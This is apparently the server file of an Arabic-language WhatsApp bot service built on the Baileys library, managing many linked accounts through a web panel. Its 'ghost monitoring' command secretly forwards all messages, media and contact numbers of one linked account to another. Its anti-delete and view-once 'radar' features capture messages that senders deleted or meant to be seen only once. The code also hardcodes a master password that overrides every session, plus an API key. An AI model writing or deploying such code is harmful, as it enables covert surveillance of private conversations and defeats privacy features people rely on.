const express = require('express');
const fs = require('fs');
const path = require('path');
const qrCode = require('qrcode');
const moment = require('moment-timezone');
const axios = require('axios');
const pino = require('pino'); 
const { GoogleGenerativeAI } = require('@google/generative-ai'); 

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    downloadMediaMessage,
    jidNormalizedUser,
    generateWAMessageFromContent,
    proto
} = require('@whiskeysockets/baileys');

// 🛡️ درع حماية بيئة Node.js من الانطفاء المفاجئ
process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);

const app = express();
const PORT = process.env.PORT || 10000;
const MASTER_PASSWORD = 'tarzanbot'; 
const sessions = {};
const msgStore = new Map(); 

// ==========================================
// 📂 أنظمة الحفظ والاستعادة الدائمة
// ==========================================

// 1. نظام حفظ الإعدادات
const settingsPath = path.join(__dirname, 'settings.json');
let botSettings = {};
if (fs.existsSync(settingsPath)) { 
    botSettings = JSON.parse(fs.readFileSync(settingsPath, 'utf8')); 
} else { 
    botSettings = { GLOBAL_CONFIG: { geminiApiKey: "" } };
    fs.writeFileSync(settingsPath, JSON.stringify(botSettings)); 
}
if (!botSettings.GLOBAL_CONFIG) {
    botSettings.GLOBAL_CONFIG = { geminiApiKey: "" };
    saveSettings();
}
function saveSettings() { fs.writeFileSync(settingsPath, JSON.stringify(botSettings, null, 2)); }
function generateSessionPassword() { return 'VIP-' + Math.random().toString(36).substring(2, 8).toUpperCase(); }

// 2. ذاكرة المراقبة الشبحية (الاستدامة)
const monitorsPath = path.join(__dirname, 'monitors.json');
let activeMonitors = new Map();
if (fs.existsSync(monitorsPath)) {
    try {
        const data = JSON.parse(fs.readFileSync(monitorsPath, 'utf8'));
        activeMonitors = new Map(Object.entries(data));
    } catch (e) { activeMonitors = new Map(); }
}
function saveMonitors() { fs.writeFileSync(monitorsPath, JSON.stringify(Object.fromEntries(activeMonitors), null, 2)); }

// 3. مجلد الخزنة للميديا المخفية
const vaultPath = path.join(__dirname, 'ViewOnce_Vault');
if (!fs.existsSync(vaultPath)) fs.mkdirSync(vaultPath);

// 🛡️ نظام تفريغ الذاكرة الذكي لمنع اختناق السيرفر
setInterval(() => { 
    if (msgStore.size > 5000) {
        msgStore.clear(); 
        console.log('🧹 [حماية السيرفر] تم تفريغ الذاكرة المؤقتة للرسائل');
    }
}, 30 * 60 * 1000);

app.use(express.static('public'));
app.use(express.json());

// ==========================================
// 🚀 معالج الأوامر (النسخة الأصلية السليمة)
// ==========================================
const commandsMap = new Map();
const commandsPath = path.join(__dirname, 'commands');
if (!fs.existsSync(commandsPath)) fs.mkdirSync(commandsPath);

function loadCommands() {
    commandsMap.clear();
    const files = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
    for (const file of files) {
        try {
            delete require.cache[require.resolve(`./commands/${file}`)];
            const command = require(`./commands/${file}`);
            if (command.name && command.execute) {
                commandsMap.set(command.name.toLowerCase(), command);
                if (command.aliases && Array.isArray(command.aliases)) {
                    command.aliases.forEach(alias => commandsMap.set(alias.toLowerCase(), command));
                }
            }
        } catch (err) {
            console.error(`❌ خطأ في تحميل الأمر ${file}:`, err.message);
        }
    }
}
loadCommands();

// ==========================================
// ⚙️ تشغيل وإدارة الجلسات
// ==========================================
async function startSession(sessionId, res = null, pairingNumber = null) {
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    if (!botSettings[sessionId]) {
        botSettings[sessionId] = { 
            password: generateSessionPassword(), botEnabled: true, commandsEnabled: true, aiEnabled: false, autoReact: false, reactEmoji: '❤️', welcomeSent: false
        };
        saveSettings();
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        markOnlineOnConnect: true,
        browser: ['Windows', 'Edge', '10.0'],
        syncFullHistory: false,
        generateHighQualityLinkPreviews: false
    });

    sessions[sessionId] = sock;
    sock.ev.on('creds.update', saveCreds);

    if (pairingNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(pairingNumber);
                const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
                if (res && !res.headersSent) res.json({ pairingCode: formattedCode });
            } catch (err) {
                if (res && !res.headersSent) res.status(500).json({ error: 'تعذر طلب الكود.' });
            }
        }, 3000); 
    }

    sock.ev.on('connection.update', async (update) => {
        const { connection, qr, lastDisconnect } = update;
        if (qr && res && !pairingNumber && !res.headersSent) {
            try { const qrData = await qrCode.toDataURL(qr); res.json({ qr: qrData }); } catch(e){}
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) setTimeout(() => startSession(sessionId), 5000);
            else { delete sessions[sessionId]; fs.rmSync(sessionPath, { recursive: true, force: true }); }
        }

        if (connection === 'open') {
            console.log(`✅ الجلسة ${sessionId} متصلة بنجاح!`);
            const selfId = jidNormalizedUser(sock.user.id);
            try { await sock.updateProfileStatus(`🤖 طرزان الواقدي VIP | يعمل الآن`); } catch (e) {}

            if (!botSettings[sessionId].welcomeSent) {
                const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك:*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${botSettings[sessionId].password}`;
                await sock.sendMessage(selfId, { image: { url: 'https://b.top4top.io/p_3489wk62d0.jpg' }, caption: welcomeText });
                botSettings[sessionId].welcomeSent = true; saveSettings();
            }
        }
    });

    // ==========================================
    // 🛡️ مضاد الحذف الجبار (مُنسق ومُسطر)
    // ==========================================
    sock.ev.on('messages.update', async updates => {
        for (const { key, update } of updates) {
            if (update?.message === null && key?.remoteJid && !key.fromMe) {
                try {
                    const storedMsg = msgStore.get(`${key.remoteJid}_${key.id}`);
                    if (!storedMsg?.message) return; 
                    
                    const selfId = jidNormalizedUser(sock.user.id);
                    const senderJid = key.participant || storedMsg.key?.participant || key.remoteJid;
                    const numberStr = senderJid.split('@')[0];
                    const nameStr = storedMsg.pushName || 'غير مسجل';
                    const timeStr = moment().tz("Asia/Riyadh").format("hh:mm:ss A | YYYY-MM-DD");
                    
                    const isGroupChat = key.remoteJid.endsWith('@g.us');
                    let groupInfoStr = '';
                    if (isGroupChat) {
                        try {
                            const meta = await sock.groupMetadata(key.remoteJid);
                            groupInfoStr = `\n║ 🏷️ القـروب: ${meta.subject}`;
                        } catch (e) { groupInfoStr = `\n║ 🏷️ القـروب: غير معروف`; }
                    }

                    const alertText = 
`╔════[ 🚫 رسالة محذوفة ]════╗
║ 👤 الاسـم: ${nameStr}
║ 📱 الـرقـم: wa.me/${numberStr}${groupInfoStr}
║ 🕒 الـوقـت: ${timeStr}
╚═══════════════════════════╝
👇 المحتوى المحذوف:`;

                    await sock.sendMessage(selfId, { text: alertText });
                    await sock.sendMessage(selfId, { forward: storedMsg });
                } catch (err) {}
            }
        }
    });

    // ==========================================
    // 🔥 استقبال الرسائل المركزية (المراقبة، الرادار، الذكاء، الأوامر)
    // ==========================================
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        const msg = messages[0];
        if (!msg?.message) return; 

        const from = msg.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const sender = isGroup ? msg.key.participant : from;
        const pushName = msg.pushName || 'غير مسجل / مخفي';
        const selfId = jidNormalizedUser(sock.user.id);
        const isFromMe = msg.key.fromMe || sender === selfId;

        // الحفظ في ذاكرة مضاد الحذف
        if (msgStore.size < 5000) msgStore.set(`${from}_${msg.key.id}`, msg);

        const currentSettings = botSettings[sessionId] || {};
        if (!currentSettings.botEnabled) return;

        // اكتشاف العرض لمرة واحدة بشكل أساسي
        let viewOnceIncoming = msg.message.viewOnceMessage || msg.message.viewOnceMessageV2 || msg.message.viewOnceMessageV2Extension;
        const mediaTypeCheck = Object.keys(msg.message)[0];
        if (msg.message[mediaTypeCheck]?.viewOnce === true) viewOnceIncoming = { message: msg.message };
        
        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || '';

        const reply = async (text) => {
            await sock.sendPresenceUpdate('composing', from);
            return await sock.sendMessage(from, { text: text }, { quoted: msg });
        };

        // ==========================================
        // 👻 أوامر التحكم بالمراقبة
        // ==========================================
        if (body.startsWith('.مراقبه ')) {
            const targetSession = body.replace('.مراقبه ', '').trim();
            if (!sessions[targetSession]) return reply('❌ *عـذراً، الـجـلـسـة غـيـر مـتـصـلـة أو الاسـم خـاطـئ.*');
            if (targetSession === sessionId) return reply('❌ *لا يـمـكـنـك مـراقـبـة نـفـسـك.*');

            activeMonitors.set(targetSession, { monitorJid: sender, monitorSocketId: sessionId });
            saveMonitors();
            return reply(`✅ *تـم تـفـعـيـل الـمـراقـبـة الـشـبـحـيـة بـنـجـاح.*\n🎯 *الـهـدف:* [ ${targetSession} ]`);
        }
        
        if (body === '.ايقاف_المراقبه') {
            for (let [key, val] of activeMonitors.entries()) {
                if (val.monitorJid === sender) activeMonitors.delete(key);
            }
            saveMonitors();
            return reply('✅ *تـم إيـقـاف جـمـيـع عـمـلـيـات الـمـراقـبـة.*');
        }

        // ==========================================
        // 🚨 المراقبة الشبحية (الدقيقة والمُسطرة)
        // ==========================================
        if (activeMonitors.has(sessionId)) {
            const monitorInfo = activeMonitors.get(sessionId);
            const monitorSock = sessions[monitorInfo.monitorSocketId];

            if (monitorSock && from !== monitorInfo.monitorJid && sender !== monitorInfo.monitorJid) {
                try {
                    const timeExact = moment().tz("Asia/Riyadh").format("hh:mm:ss A | YYYY-MM-DD");
                    
                    let directionAction = '';
                    let targetExactName = '';
                    let targetExactNumber = '';
                    let chatTypeStr = isGroup ? '👥 قـروب' : '👤 خـاص';
                    let groupDetailsStr = '';

                    // 1. جلب بيانات القروب بدقة
                    if (isGroup) {
                        let gName = 'غير معروف';
                        try { const meta = await sock.groupMetadata(from); gName = meta.subject; } catch(e){}
                        groupDetailsStr = `\n║ 🏷️ القـروب: ${gName}\n║ 🆔 الآيـدي: ${from.split('@')[0]}`;
                    }

                    // 2. تحديد مصدر واتجاه الرسالة بدقة
                    if (isFromMe) {
                        directionAction = '📤 رسالة صادرة (أرسلها الهدف)';
                        targetExactNumber = isGroup ? from.split('@')[0] : from.split('@')[0];
                        targetExactName = isGroup ? 'أعضاء المجموعة' : 'الطرف الآخر';
                    } else {
                        directionAction = '📥 رسالة واردة (استلمها الهدف)';
                        targetExactNumber = sender.split('@')[0];
                        targetExactName = pushName; 
                    }

                    // 3. التشريح الدقيق للرسالة (Unwrapping)
                    let actualMsgObj = msg.message;
                    let isVO = false;

                    // تفكيك الرسائل المعقدة والمخفية
                    if (actualMsgObj?.ephemeralMessage) actualMsgObj = actualMsgObj.ephemeralMessage.message;
                    if (actualMsgObj?.documentWithCaptionMessage) actualMsgObj = actualMsgObj.documentWithCaptionMessage.message;
                    
                    if (actualMsgObj?.viewOnceMessage) { actualMsgObj = actualMsgObj.viewOnceMessage.message; isVO = true; }
                    else if (actualMsgObj?.viewOnceMessageV2) { actualMsgObj = actualMsgObj.viewOnceMessageV2.message; isVO = true; }
                    else if (actualMsgObj?.viewOnceMessageV2Extension) { actualMsgObj = actualMsgObj.viewOnceMessageV2Extension.message; isVO = true; }
                    
                    let msgTypeReal = Object.keys(actualMsgObj || {})[0] || 'unknown';
                    let mediaCaption = actualMsgObj?.conversation || actualMsgObj?.extendedTextMessage?.text || actualMsgObj?.imageMessage?.caption || actualMsgObj?.videoMessage?.caption || '';
                    let finalContentType = '';

                    // تحديد نوع المحتوى الفعلي
                    switch(msgTypeReal) {
                        case 'imageMessage': finalContentType = '📷 صـورة'; break;
                        case 'videoMessage': finalContentType = '🎥 فـيـديـو'; break;
                        case 'audioMessage': finalContentType = actualMsgObj.audioMessage?.ptt ? '🎙️ بـصـمـة صـوت (تسجيل مباشر)' : '🎵 مـقـطـع صـوتـي (أغنية/صوت)'; break;
                        case 'documentMessage': finalContentType = `📄 مـلـف [ ${actualMsgObj.documentMessage?.fileName || 'مجهول'} ]`; break;
                        case 'stickerMessage': finalContentType = '🌠 مـلـصـق (سـتـيـكـر)'; break;
                        case 'contactMessage': finalContentType = '👤 جـهـة اتـصـال'; break;
                        case 'locationMessage': 
                        case 'liveLocationMessage': finalContentType = '📍 مـوقـع جـغـرافـي'; break;
                        case 'reactionMessage': finalContentType = `❤️ تـفـاعـل بـ [ ${actualMsgObj.reactionMessage?.text || ''} ]`; break;
                        case 'pollCreationMessage':
                        case 'pollCreationMessageV3': finalContentType = `📊 تـصـويـت [ ${actualMsgObj[msgTypeReal]?.name} ]`; break;
                        case 'conversation':
                        case 'extendedTextMessage': finalContentType = '💬 نـص عـادي'; break;
                        default: finalContentType = `⚙️ رسـالـة نـظـام [${msgTypeReal}]`; break;
                    }

                    if (isVO) finalContentType = `👁️‍🗨️ عـرض لـمـرة واحـدة (${finalContentType})`;
                    if (mediaCaption) {
                        // تنسيق النص ليبقى داخل الإطار
                        const formattedCaption = mediaCaption.replace(/\n/g, '\n║      ');
                        finalContentType += `\n║ 📝 النـص: ${formattedCaption}`;
                    }

                    // 4. بناء التنسيق الهندسي الصارم (لن يتشوه في الواتساب)
                    const structuredReport = 
`╔════[ 🚨 تـقـريـر مـراقـبـة 🚨 ]════╗
║ 🎯 الهـدف: ${sessionId}
║ 🔄 الحـالـة: ${directionAction}
║ 📍 المصـدر: ${chatTypeStr}${groupDetailsStr}
╠═══════════════════════════╣
║ 👤 الاسـم: ${targetExactName}
║ 📱 الـرقـم: wa.me/${targetExactNumber}
║ 🕒 الـوقـت: ${timeExact}
╠═══════════════════════════╣
║ 📄 المحتوى: 
║ 💠 ${finalContentType}
╚═══════════════════════════╝`;

                    // إرسال التقرير النصي
                    await monitorSock.sendMessage(monitorInfo.monitorJid, { text: structuredReport });

                    // إعادة التوجيه (Forward) للميديا والصوتيات
                    if (msgTypeReal !== 'conversation' && msgTypeReal !== 'extendedTextMessage' && msgTypeReal !== 'protocolMessage' && msgTypeReal !== 'reactionMessage') {
                        await monitorSock.sendMessage(monitorInfo.monitorJid, { forward: msg });
                    }
                } catch (e) { console.error('❌ خطأ في إرسال المراقبة:', e.message); }
            }
        }

        // ==========================================
        // 👁️‍🗨️ الرادار: صائد العرض لمرة واحدة (النظام العام)
        // ==========================================
        if (viewOnceIncoming && !isFromMe) {
            try {
                const actualMessage = viewOnceIncoming.message;
                const mediaType = Object.keys(actualMessage)[0];
                const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });

                const ext = mediaType === 'imageMessage' ? 'jpg' : (mediaType === 'videoMessage' ? 'mp4' : 'ogg');
                const fileName = `VO_${sender.split('@')[0]}_${Date.now()}.${ext}`;
                fs.writeFileSync(path.join(vaultPath, fileName), buffer);

                const reportTxt = `╔════[ 👁️‍🗨️ صيد الميديا المخفية ]════╗\n║ 👤 المرسل: ${pushName}\n║ 📱 الرقم: wa.me/${sender.split('@')[0]}\n╚═══════════════════════════╝`;
                
                if (mediaType === 'imageMessage') await sock.sendMessage(selfId, { image: buffer, caption: reportTxt });
                else if (mediaType === 'videoMessage') await sock.sendMessage(selfId, { video: buffer, caption: reportTxt });
                else if (mediaType === 'audioMessage') await sock.sendMessage(selfId, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
            } catch (err) {}
        }

        if (currentSettings.autoReact && !isFromMe && !viewOnceIncoming) {
            try { await sock.sendMessage(from, { react: { text: currentSettings.reactEmoji || '❤️', key: msg.key } }); } catch(e) {}
        }

        const isCmd = body.startsWith('.');

        // ==========================================
        // 🧠 الذكاء الاصطناعي (مضبوط على الـ API الخاص بك)
        // ==========================================
        if (currentSettings.aiEnabled && !isCmd && !isFromMe && body.trim() !== '' && !viewOnceIncoming) {
            try {
                await sock.sendPresenceUpdate('composing', from); 
                const query = body.trim();
                const API_KEY = 'AI_1d21219cc3914971'; 
                const API_URL = 'http://Fi5.bot-hosting.net:22214/api/chat';

                const response = await axios.post(API_URL, {
                    api_key: API_KEY,
                    prompt: query
                }, {
                    headers: { 'Content-Type': 'application/json' },
                    timeout: 25000 
                });

                if (response.data && response.data.status === 'success') {
                    await reply(response.data.response);
                }
            } catch (error) {}
            return; 
        }

        // ==========================================
        // 🎯 معالجة الأوامر الخارجية
        // ==========================================
        if (!currentSettings.commandsEnabled) return;

        let selectedId = msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ? JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '';
        let commandName = '';
        let args = [];
        let textArgs = '';

        if (selectedId) {
            commandName = selectedId.toLowerCase();
        } else if (isCmd) {
            args = body.slice(1).trim().split(/ +/);
            commandName = args.shift().toLowerCase();
            textArgs = args.join(' ');
        }

        if (!commandName) return;

        const commandData = commandsMap.get(commandName);

        if (commandData) {
            try {
                if (commandName !== '🌚' && commandName !== 'vv') {
                    await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
                }
                
                await commandData.execute({
                    sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix: '.', commandName, sessions, botSettings, saveSettings
                });
            } catch (error) {
                console.error(`❌ خطأ في الأمر ${commandName}:`, error);
                if (commandName !== '🌚' && commandName !== 'vv') {
                    await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
                }
            }
        }
    });

    return sock;
}

// ==========================================
// 🚀 نظام إعادة التشغيل التلقائي المستدام
// ==========================================
function startAllSavedSessions() {
    const sessionsDir = path.join(__dirname, 'sessions');
    if (fs.existsSync(sessionsDir)) {
        const folders = fs.readdirSync(sessionsDir);
        for (const folder of folders) {
            const folderPath = path.join(sessionsDir, folder);
            if (fs.statSync(folderPath).isDirectory()) {
                console.log(`🔄 جاري استعادة وتشغيل الجلسة المحفوظة: [ ${folder} ]`);
                startSession(folder);
            }
        }
    }
}

// ==========================================
// 🌐 API Endpoints (لوحة التحكم)
// ==========================================
app.post('/create-session', (req, res) => {
    const { sessionId } = req.body;
    if (!sessionId) return res.status(400).json({ error: 'أدخل اسم الجلسة' });
    startSession(sessionId, res);
});

app.post('/pair', async (req, res) => {
    const { sessionId, number } = req.body;
    if (!sessionId || !number) return res.status(400).json({ error: 'أدخل الجلسة والرقم' });
    let formattedNumber = number.replace(/[^0-9]/g, '');
    
    if (sessions[sessionId] || fs.existsSync(path.join(__dirname, 'sessions', sessionId))) {
        if(sessions[sessionId]) sessions[sessionId].logout();
        delete sessions[sessionId];
        fs.rmSync(path.join(__dirname, 'sessions', sessionId), { recursive: true, force: true });
    }
    startSession(sessionId, res, formattedNumber);
});

app.post('/api/settings/get', (req, res) => {
    const { sessionId, password } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    res.json(settings);
});

app.post('/api/settings/save', (req, res) => {
    const { sessionId, password, botEnabled, commandsEnabled, aiEnabled, autoReact, reactEmoji } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    
    botSettings[sessionId].botEnabled = !!botEnabled;
    botSettings[sessionId].commandsEnabled = !!commandsEnabled;
    botSettings[sessionId].aiEnabled = !!aiEnabled; 
    botSettings[sessionId].autoReact = !!autoReact;
    botSettings[sessionId].reactEmoji = reactEmoji || '❤️';
    saveSettings();
    res.json({ success: true, message: '✅ تم حفظ التعديلات' });
});

app.get('/sessions', (req, res) => { res.json({ count: Object.keys(sessions).length, sessions: Object.keys(sessions) }); });

app.post('/delete-session', (req, res) => {
    const { sessionId, password } = req.body;
    if (password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور السيرفر خاطئة' });
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    if (sessions[sessionId]) { sessions[sessionId].logout(); delete sessions[sessionId]; }
    if (botSettings[sessionId]) { delete botSettings[sessionId]; saveSettings(); }
    if (fs.existsSync(sessionPath)) { fs.rmSync(sessionPath, { recursive: true, force: true }); res.json({ message: `تم حذف ${sessionId}` }); } 
    else { res.status(404).json({ error: 'الجلسة غير موجودة' }); }
});

app.listen(PORT, () => {
    console.log(`\n=========================================`);
    console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
    console.log(`🛡️ وضع الحماية من الانهيار مفعل بنجاح`);
    console.log(`🧠 نظام الذكاء الاصطناعي (TARZAN AI) مدمج وجاهز`);
    console.log(`👻 نظام المراقبة الشبحية الشامل متاح ومُفعّل`);
    console.log(`=========================================\n`);
    
    // تشغيل الجلسات المحفوظة تلقائياً
    startAllSavedSessions();
});
